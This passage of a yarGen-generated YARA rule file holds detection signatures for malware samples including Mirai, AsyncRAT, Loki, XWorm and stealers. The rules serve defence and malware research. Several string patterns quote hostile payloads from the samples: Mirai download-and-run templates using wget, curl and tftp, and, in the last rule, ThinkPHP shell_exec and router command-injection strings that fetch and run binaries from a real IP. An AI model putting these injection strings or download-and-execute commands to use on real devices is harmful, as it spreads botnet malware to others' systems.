      $s14 = "exploit_pid" fullword ascii /* score: '8.00'*/
      $s15 = "exploit_init" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_65 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Traitor(signature).elf, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash5 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
      hash6 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
      hash7 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $s1 = "runtime.sysHugePage" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.boundsError.Error" fullword ascii /* score: '13.00'*/
      $s3 = "*runtime.dlogPerM" fullword ascii /* score: '12.00'*/
      $s4 = "aeshashbody" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.heapRetained" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.panicSlice3Alen" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.init.6" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*boundsError).Error" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.panicSliceAlen" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.panicCheck1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.itoa" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.goPanicSliceAlenU" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.doInit" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.panicSliceBU" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.goPanicSliceAlen" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_66 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "syscall.forkAndExecInChild1" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysMmap" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysMunmap" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.(*sigctxt).rbp" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.(*sigctxt).rax" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.sigprofNonGo" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.(*sigctxt).rip" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.mmap.func1" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*sigctxt).rbx" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.(*sigctxt).rsp" fullword ascii /* score: '10.00'*/
      $s11 = ".debug_gdb_scripts" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.(*sigctxt).rdi" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*sigctxt).rdx" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.munmap.func1" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*sigctxt).rsi" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash__XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c7f4e1_68 {
   meta:
      description = "dropzone - from files Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash).exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "44643df29551a463002fdf0a4eb38b8e6dce0f7054eda1b4383f96a12fe54945"
      hash2 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
   strings:
      $s1 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s2 = "SMTP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s3 = "POP3 Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s4 = "IMAP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s5 = "NNTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s6 = "HTTP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '15.00'*/
      $s7 = "encryptedUsername" fullword ascii /* score: '12.00'*/
      $s8 = "IMAP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s9 = "HTTP Server URL" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s10 = "POP3 User" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( all of them )
      ) or ( all of them )
}

rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963_69 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash5 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
      hash6 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d"
      )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963_70 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash3 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash4 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash5 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "runtime.gettid" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sched_getaffinity" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.sysSigaction" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.sysauxv" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.rtsigprocmask" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.mincore" fullword ascii /* score: '10.00'*/
      $s7 = "runtime._ELF_ST_BIND" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.clone" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.futexsleep" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.sigfillset" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.futexwakeup" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.netpollclose" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.minitSignals" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.futexwakeup.func1" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.futex" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0af949db_Mirai_signature__19addd46_Mirai_signature__5408157a_Mirai_signature__7abf04aa_Mirai_signature__83_71 {
   meta:
      description = "dropzone - from files Mirai(signature)_0af949db.elf, Mirai(signature)_19addd46.elf, Mirai(signature)_5408157a.elf, Mirai(signature)_7abf04aa.elf, Mirai(signature)_83d2ee29.elf, Mirai(signature)_c6407647.elf, Mirai(signature)_d2890a93.elf, Mirai(signature)_dc1c46ab.elf, Mirai(signature)_e58625c8.elf, Mirai(signature)_f05ae503.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0af949db182b50afc760f0b7488ab9f82b603fbdc08586a9c10ed100bec3d249"
      hash2 = "19addd461e46630506b49099603c4910281eb64454c7d7c8628e082c435df5a5"
      hash3 = "5408157aae234b88549d499aa551f55fcdd60b0b716496460a00417a193056bc"
      hash4 = "7abf04aae33ce14e0fbf0c39159cbc858763134e113f9998331257f05e10dd15"
      hash5 = "83d2ee29537d8d9e67b5d12ad241e3e9ff2116a6873cb6e6e82afd16125a4fa2"
      hash6 = "c6407647d371be30a86c48b8f546f2638df69039bb3121718131810ceb6363bd"
      hash7 = "d2890a937a490a105ca269aded1cc32ffaf4a6ef08393b33d252d7393c634fbe"
      hash8 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
      hash9 = "e58625c8078782ba4ccac7c25fdaed9669471bb7d551cb3fe04234850f082c4b"
      hash10 = "f05ae5031d5a336100b5d2880a329d675b781af9a45e45c3af31964396bbbfd8"
   strings:
      $s1 = "[KILLER] scan_process_signatures matched for PID %d, killing it" fullword ascii /* score: '21.50'*/
      $s2 = "[KILLER] Process \"%s\" matches self_names[%zu]: %s" fullword ascii /* score: '18.00'*/
      $s3 = "[ATTACK] attack process running, vector=%d" fullword ascii /* score: '15.00'*/
      $s4 = "[KILLER] scan_maps signature found in cmdline for PID %d" fullword ascii /* score: '13.00'*/
      $s5 = "[KILLER] scan_maps: found encrypted signature \"%s\" in PID %d" fullword ascii /* score: '13.00'*/
      $s6 = "[KILLER] Detected killer_pid %d is not running, respawning!" fullword ascii /* score: '13.00'*/
      $s7 = "[ATTACK] Found method for vector %d, running" fullword ascii /* score: '12.50'*/
      $s8 = "[KILLER] strong_persistence child executing in memory" fullword ascii /* score: '12.00'*/
      $s9 = "[KILLER] PID %d is whitelisted (killer/telnet/exploit/self)" fullword ascii /* score: '11.00'*/
      $s10 = "[KILLER] process_locker called" fullword ascii /* score: '11.00'*/
      $s11 = "[KILLER] killer_init() starting. killer_pid: %d telnet_pid: %d exploit_pid: %d" fullword ascii /* score: '11.00'*/
      $s12 = "[KILLER] scan_maps signature in maps for PID %d, killing it" fullword ascii /* score: '10.50'*/
      $s13 = "[ATTACK] attack child (timer) sleeping %d then killing parent %d" fullword ascii /* score: '10.00'*/
      $s14 = "[KILLER] getppid() != 1, starting strong_persistence" fullword ascii /* score: '9.00'*/
      $s15 = "[KILLER] scan_maps signature found in net/%s for PID %d" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1_bc21f3f0_72 {
   meta:
      description = "dropzone - from files AsyncRAT(signature).js, bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1_bc21f3f0.js"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "947232f33c2aaf3df3952d23c6ce7d611c1cc0dac1f1e2b236ab96a84eb32277"
      hash2 = "bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1"
   strings:
      $s1 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s2 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s3 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s4 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s5 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s7 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s8 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s9 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s10 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s12 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s13 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s14 = "    // Get PDC configuration file from script context" fullword ascii /* score: '13.00'*/
      $s15 = "            + \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' \"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_73 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
   strings:
      $s1 = "net.addrinfoErrno.Temporary" fullword ascii /* score: '14.00'*/
      $s2 = "net.(*addrinfoErrno).Temporary" fullword ascii /* score: '11.00'*/
      $s3 = "net.acquireThread" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.cgoUse" fullword ascii /* score: '10.00'*/
      $s5 = "net.cgoLookupServicePort" fullword ascii /* score: '10.00'*/
      $s6 = "net.cgoLookupPort" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.cgoCheckUnknownPointer" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.inheap" fullword ascii /* score: '10.00'*/
      $s9 = "net.cgoLookupIP" fullword ascii /* score: '10.00'*/
      $s10 = "net.releaseThread" fullword ascii /* score: '10.00'*/
      $s11 = "net.addrinfoErrno.Error" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.cgoCheckPointer" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.cgoCheckArg" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_74 {
   meta:
      description = "dropzone - from files 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash3 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os/exec.(*Cmd).closeDescriptors" fullword ascii /* score: '23.00'*/
      $s2 = "/*struct { F uintptr; pw *os.File; c *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s3 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s4 = "os/exec.(*Cmd).stdin" fullword ascii /* score: '17.00'*/
      $s5 = "os/exec.(*Cmd).stdin.func1" fullword ascii /* score: '17.00'*/
      $s6 = "os/exec.(*Cmd).stdout" fullword ascii /* score: '17.00'*/
      $s7 = "os/exec.(*Cmd).envv" fullword ascii /* score: '17.00'*/
      $s8 = "os/exec.(*Cmd).stderr" fullword ascii /* score: '17.00'*/
      $s9 = "os.(*Process).blockUntilWaitable" fullword ascii /* score: '15.00'*/
      $s10 = "os.(*Process).setDone" fullword ascii /* score: '15.00'*/
      $s11 = "closeDescriptors" fullword ascii /* score: '13.00'*/
      $s12 = "type..eq.os/exec.Error" fullword ascii /* score: '10.00'*/
      $s13 = "type..eq.os.ProcessState" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.beforefork" fullword ascii /* score: '10.00'*/
      $s15 = "type..eq.os.Process" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__3240804c_Mirai_signature__5f9ec296_Mirai_signature__6675652a_Mirai_signature__68a55330_Mirai_signature__6a_75 {
   meta:
      description = "dropzone - from files Mirai(signature)_3240804c.elf, Mirai(signature)_5f9ec296.elf, Mirai(signature)_6675652a.elf, Mirai(signature)_68a55330.elf, Mirai(signature)_6aaa42b7.elf, Mirai(signature)_6d8090fe.elf, Mirai(signature)_79f6ce1d.elf, Mirai(signature)_7f0db662.elf, Mirai(signature)_87baa0c5.elf, Mirai(signature)_e80eef49.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3240804c076c7fabd619b1e7aaef80e263568ce358039cc52cf4e37554720fcf"
      hash2 = "5f9ec2967cc4f21ae41e5050d5b4a79c29e50059c34da1204b74322580a0785e"
      hash3 = "6675652a17bf6d9e2f1d6ce009a5b455435298e74dc03e62052b11e1eefe7f2f"
      hash4 = "68a55330c8b7eb8b6220475aeebd7cbd4c41f27d42889c375ff0a8e6fb0a113a"
      hash5 = "6aaa42b794d3f8987f104542bb2ddb9cfe7c377e833dc2f9fbd24647bd2060f9"
      hash6 = "6d8090fec672f53c725b8113852f711172922038c08439fd14c8e1f4a3f7fb99"
      hash7 = "79f6ce1d23c7d274a764de6ff271a6cab2a51b551781bab1215691855bfe4c49"
      hash8 = "7f0db6628b1b26577729a675e284197f36ad36a4c3b5c94a6e1496a7ccc83244"
      hash9 = "87baa0c53ae24c133e76021d004b8015d128aabd7042b57d59167377ff395e06"
      hash10 = "e80eef4929318ff24d31170fee00d2ff8f9fceb27b3f8ca96f1a07206345cc6f"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s12 = "cryptonight" fullword ascii /* score: '8.00'*/
      $s13 = "cgminer" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_76 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.(*Cmd).Wait" fullword ascii /* score: '17.00'*/
      $s4 = "os.(*ProcessState).Success" fullword ascii /* score: '15.00'*/
      $s5 = "os.(*Process).done" fullword ascii /* score: '15.00'*/
      $s6 = "os/exec.(*ExitError).String" fullword ascii /* score: '15.00'*/
      $s7 = "os/exec.ExitError.String" fullword ascii /* score: '15.00'*/
      $s8 = "os.(*Process).Wait" fullword ascii /* score: '15.00'*/
      $s9 = "os/exec.(*ExitError).Error" fullword ascii /* score: '15.00'*/
      $s10 = "*exec.ExitError" fullword ascii /* score: '15.00'*/
      $s11 = "os.newProcess" fullword ascii /* score: '15.00'*/
      $s12 = "os.(*Process).wait" fullword ascii /* score: '15.00'*/
      $s13 = "syscall.Pipe" fullword ascii /* score: '9.00'*/
      $s14 = "syscall.pipe" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}


rule _Mirai_signature__1c716b97_Mirai_signature__1e6b7751_Mirai_signature__1f38241d_Mirai_signature__2ef19b86_Mirai_signature__62_78 {
   meta:
      description = "dropzone - from files Mirai(signature)_1c716b97.elf, Mirai(signature)_1e6b7751.elf, Mirai(signature)_1f38241d.elf, Mirai(signature)_2ef19b86.elf, Mirai(signature)_6208696e.elf, Mirai(signature)_8f7d7300.elf, Mirai(signature)_af23bbf2.elf, Mirai(signature)_b9f0349c.elf, Mirai(signature)_d27f28bb.elf, Mirai(signature)_f056849f.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1c716b9727fbb42317a85256ee9742fda967e3760dbeaf1ce079f00cf12d589b"
      hash2 = "1e6b775113ad6ce54c2056b944c98e57e9aeb4229f9e984e6be0f57bb8b1fcae"
      hash3 = "1f38241d75ce010f6ed0d23e546a80027c80dc7c9f6bb3606130e4cfeaf62f36"
      hash4 = "2ef19b863a897ed20f534f434e4cafd6198d218d3b77f88b03bf4767de08635b"
      hash5 = "6208696e053732681cf4cc92c51a4048fce7be21715c1de02e69096e39618d74"
      hash6 = "8f7d7300c3d5e1128fdef5d4d75a6727f485294f85b67d40cca9984020a11e3d"
      hash7 = "af23bbf29e42cd63a447473a7afd5186ff0dce4acc11b05b2c0281451b7176df"
      hash8 = "b9f0349c207e3b1b9fcc16ffe38342d7e164a792ce561152fb94b8538382651f"
      hash9 = "d27f28bb510e1f8d4db0a50a11f91e5d90e345fd3bc75aa394eabc05f7462a3c"
      hash10 = "f056849fbc88b2a93000e6297c63a940acd97c9c2375562d21aaad35b0c58516"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $x2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.201/bins/x86 -O thonkphp ;" ascii /* score: '40.00'*/
      $x3 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.201/bins/x86 -O thonkphp ;" ascii /* score: '37.00'*/
      $s4 = " -g 193.239.147.201 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadU" ascii /* score: '30.00'*/
      $s5 = "POST /cgi-bin/ViewLog.asp HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s6 = " /bin/busybox wget http://193.239.147.201/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh" fullword ascii /* score: '27.00'*/
      $s7 = "User-Agent: Uirusu/2.0" fullword ascii /* score: '17.00'*/
      $s8 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s9 = "GET /index.php?s=/index/" fullword ascii /* score: '16.00'*/
      $s10 = "Host: 192.168.0.14:80" fullword ascii /* score: '14.00'*/
